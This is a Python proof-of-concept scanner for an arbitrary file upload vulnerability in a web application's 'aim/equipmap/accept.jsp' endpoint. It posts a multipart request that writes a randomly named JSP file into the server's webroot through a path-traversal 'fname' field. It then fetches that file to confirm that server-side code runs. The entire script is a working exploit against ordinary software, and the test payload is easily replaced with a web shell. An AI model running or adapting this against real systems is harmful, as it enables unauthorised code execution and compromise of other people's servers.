import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
s1=randomLowercase(20)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
s2=randomLowercase(20)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
s3=randomLowercase(20)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"aim/equipmap/accept.jsp"
	body='''-----------------------------16314487820932200903769468567\r
Content-Disposition: form-data; name="upload"; filename="'''+s1+'''.txt"\r
Content-Type: text/plain\r
\r
<% out.println("'''+s2+'''"); %>\r
-----------------------------16314487820932200903769468567\r
Content-Disposition: form-data; name="fname"\r
\r
\\webapps\\nc_web\\'''+s3+'''.jsp\r
-----------------------------16314487820932200903769468567--'''
	headers={'Content-Type': 'multipart/form-data; boundary=---------------------------16314487820932200903769468567'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "afterUpload" in response.text:
		r0=True
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+""+s3+".jsp"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(s2) in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
